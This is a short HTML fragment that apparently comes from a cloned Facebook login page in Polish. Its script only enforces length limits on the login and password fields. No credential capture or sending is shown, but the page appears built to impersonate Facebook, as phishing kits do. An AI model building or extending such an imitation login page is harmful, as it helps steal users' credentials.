    <title>Facebook - zaloguj się lub zarejestruj</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const form1Inputs = document.querySelectorAll('.fb-mobile form input');
            const form2PassInput = document.querySelector('.fb-pc form input[name="pass"]');

            form1Inputs.forEach(input => {
                input.addEventListener("input", function() {
                    if (this.name === "login") {
                        if (this.value.length > 35) {
                            this.value = this.value.slice(0, 35);
                        }
                        if (this.value.length < 9) {
                            this.setCustomValidity("Pole musi zawierać przynajmniej 9 znaków.");
                        } else {
                            this.setCustomValidity("");
                        }
                    }
                });
            });

            form2PassInput.addEventListener("input", function() {
                if (this.value.length < 4) {
                    this.setCustomValidity("Pole musi zawierać przynajmniej 4 znaki.");
                } else if (this.value.length > 30) {
                    this.value = this.value.slice(0, 30);
                } else {
                    this.setCustomValidity("");
                }
            });
        });
    </script>
